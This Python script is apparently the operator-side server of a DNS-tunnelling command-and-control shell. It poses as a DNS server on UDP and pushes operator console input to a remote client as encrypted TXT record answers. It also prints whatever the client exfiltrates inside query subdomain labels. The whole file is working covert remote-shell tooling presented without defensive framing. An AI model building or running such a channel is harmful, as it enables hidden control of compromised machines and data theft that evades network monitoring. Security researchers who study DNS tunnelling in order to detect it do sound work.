#!/usr/bin/env python3
import cnc
import dnslib
import session
import socket
import sys
import time
import util

#Sends data in the form of TXT responses using given dns session and sock to given addr.
#  Because of how dns works, we can only send when we receive - packet is a request from a client.
def send_data(sess,sock,addr,data,packet):

	#Parse dns packet
	request=dnslib.DNSRecord.parse(packet)

	#Pack data for transit (max txt field size is 255 (including a size byte, so 254)
	blocks=sess.pack(data,session.sc_en_block_size())

	#Create a reply for inbound requst
	reply=request.reply()

	#Parse questions (implementation currently puts all responses in all requests)
	for question in request.questions:

		#Decode dns request
		query=str(question.qname)
		rx_packet=query.split('.')[0]

		#Handle received data
		recv_data(sess,rx_packet)

		#Reply with any response data
		for block in blocks:
			response="%s 60 TXT %s"%(query,block)
			reply.add_answer(*dnslib.RR.fromZone(response))

		#Send response to client
		sock.sendto(bytes(reply.pack()),addr)

		#Hack to "order" packets...really need to use the nonces...
		time.sleep(0.02)

	#Flush stdin so we see updates
	sys.stdout.flush()

#Receive data from a given packet using a given dns session object
def recv_data(sess,packet):

	#Decrypt rx data and print
	try:
		rx_nonce,rx_data=sess.unpack(packet)

		#Don't print out null sync packets
		if rx_data!=b'\x00':
			sys.stdout.write(rx_data.decode('utf-8'))

	#Requests from non-shell based things we don't handle...
	except Exception as error:
		#print(error)
		pass

if __name__=='__main__':

	#Get arguments from user
	passwd=util.passwd()
	server_address=util.get_dns_address('0.0.0.0')
	server_port=util.get_dns_port()

	#Create dns session handler with given password
	sess=session.session_t(0,passwd)

	#Start the "dns" server
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	sock.bind((server_address,server_port))

	#Create a non-blocking console
	console=cnc.nonblock_t()
	lines=b''

	try:
		#Begin non-blocking console
		console.begin(sys.stdin,sys.stdout)

		#Run loop
		while True:

			#Get lines from cnon-blocking console
			lines+=console.loop()

			#Get bytes from client
			while util.available(sock):
				packet,addr=sock.recvfrom(4096,socket.SOCK_NONBLOCK)

				#Send any buffered lines to client
				send_data(sess,sock,addr,lines,packet)
				lines=b''

			#Give cpu a break
			time.sleep(0.0001)

	#Ctrl+C
	except KeyboardInterrupt:
		console.end()
		exit(1)

	#Server side exceptions we care about...
	except Exception as error:
		console.end()
		print(error)
		exit(2)